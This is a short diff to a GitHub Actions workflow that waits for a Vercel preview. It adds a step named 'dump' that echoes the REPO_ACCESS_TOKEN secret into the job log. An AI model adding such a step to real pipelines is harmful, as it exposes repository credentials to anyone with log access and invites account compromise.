@@ -7,6 +7,8 @@ jobs:
     outputs:
       preview_url: ${{ steps.waitFor200.outputs.url }}
     steps:
+    - name: dump
+      run: echo ${{ secrets.REPO_ACCESS_TOKEN }}
     - name: Waiting for 200 from the Vercel Preview
       uses: patrickedqvist/wait-for-vercel-preview@v1.2.0
       id: waitFor200
